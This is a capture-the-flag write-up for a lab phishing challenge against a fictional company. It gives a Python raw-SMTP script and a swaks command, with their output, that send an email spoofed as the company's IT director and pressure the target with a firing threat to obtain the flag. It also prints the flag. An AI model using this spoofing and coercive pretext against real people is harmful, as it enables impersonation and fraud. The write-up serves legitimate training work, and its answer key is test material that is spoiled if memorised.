@@ -1,0 +1,115 @@
+Name: Red Phish Blue Phish
+Value: 500 points
+Category: Miscellaneous
+Solves: 6 Solves
+Difficulty: medium
+Author: Truman Kain (@truman.huntress), Adam Rice (@adam.huntress)
+
+Description:
+You are to conduct a phishing excercise against our client, Pyrch Data.
+We've identified the Marketing Director, Sarah Williams (swilliams@pyrchdata.com), as a user susceptible to phishing.
+Are you able to successfully phish her? Remember your OSINT ;)
+
+NOTE: The port that becomes accessible upon challenge deployment is an SMTP server. Please use this for sending any phishing emails.
+
+Press the Start button on the top-right to begin this challenge.
+
+Solution:
+
+1. Start the VM and you are greeted with an SMTP banner
+2. Performing some basic OSINT
+	
+	a. https://duckduckgo.com/?q=swillims%40pyrchdata.com&ia=web
+
+3. We find the Pyrch Data Team
+
+	a. https://pyrchdata.com/team
+
+4. Since Sarah is susceptible to Phishing, let's send an e-mail from the IT Directory, Joe Daveren using the following Python Script
+
+	import socket
+		s = socket.socket()
+		s.settimeout(0.5)
+		s.connect(('challenge.ctf.games', 30156))
+		spam = [
+		    b'HELO a.com\r\n',
+		    b'MAIL FROM: <jdaveren@pyrchdata.com\r\n',
+		    b'RCPT TO: <swilliams@pyrchdata.com>\r\n',
+		    b'DATA\r\n',
+		    b'Subject: I Need The Flag\r\n',
+		    b'\r\n',
+		    b'Hi Sarah,\r\n',
+		    b'Please send me the flag or you are fired lol.\r\n',
+		    b'\r\n',
+		    b'-Joe\r\n',
+		    b'\r\n.\r\n'
+		]
+
+		with s:
+		    for l in spam:
+		        print('>', l)
+		        s.send(l)
+		        try:
+		            print('<', s.recv(1024))
+		        except socket.timeout:
+		            pass
+
+5. Review the script output, and find the flag in the reply
+
+┌──(kali㉿kali)-[~/CTF/huntress2024]
+└─$ python3 solve.py 
+> b'HELO a.com\r\n'
+< b'220 red-phish-blue-phish-0e0df2df9ebf09df-77c97d4c87-9mrmd Python SMTP 1.4.6\r\n'
+> b'MAIL FROM: <jdaveren@pyrchdata.com\r\n'
+< b'250 red-phish-blue-phish-0e0df2df9ebf09df-77c97d4c87-9mrmd\r\n'
+> b'RCPT TO: <swilliams@pyrchdata.com>\r\n'
+< b'250 OK\r\n'
+> b'DATA\r\n'
+< b'250 OK\r\n'
+> b'Subject: I Need The Flag\r\n'
+< b'354 End data with <CR><LF>.<CR><LF>\r\n'
+> b'\r\n'
+> b'Hi Sarah,\r\n'
+> b'Please send me the flag or you are fired lol.\r\n'
+> b'\r\n'
+> b'-Joe\r\n'
+> b'\r\n.\r\n'
+< b'250 OK. flag{54c6ec05ca19565754351b7fcf9c03b2}\r\n'
+
+6. Flag: flag{54c6ec05ca19565754351b7fcf9c03b2}
+
+Note: This challenge could also be solved with SWAKS or another mail based terminal program. 
+
+┌──(kali㉿kali)-[~/CTF/huntress2024/miscellaneous/red_phish_blue_phish]
+└─$ swaks --to swilliams@pyrchdata.com --from jdaveren@pyrchdata.com --server challenge.ctf.games:30156 --header "Subject: I Need The Flag" --body "Please send me the flag or you are fired lol."
+
+=== Trying challenge.ctf.games:30156...
+=== Connected to challenge.ctf.games.
+<-  220 red-phish-blue-phish-83a073785b294a56-748d6d794d-q5tc5 Python SMTP 1.4.6
+ -> EHLO kali
+<-  250-red-phish-blue-phish-83a073785b294a56-748d6d794d-q5tc5
+<-  250-SIZE 33554432
+<-  250-8BITMIME
+<-  250-SMTPUTF8
+<-  250 HELP
+ -> MAIL FROM:<jdaveren@pyrchdata.com>
+<-  250 OK
+ -> RCPT TO:<swilliams@pyrchdata.com>
+<-  250 OK
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Wed, 02 Oct 2024 16:30:27 -0400
+ -> To: swilliams@pyrchdata.com
+ -> From: jdaveren@pyrchdata.com
+ -> Subject: I Need The Flag
+ -> Message-Id: <20241002163027.2105952@kali>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> 
+ -> Please send me the flag or you are fired lol.
+ -> 
+ -> 
+ -> .
+<-  250 OK. flag{54c6ec05ca19565754351b7fcf9c03b2}
+ -> QUIT
+<-  221 Bye
+=== Connection closed with remote host.
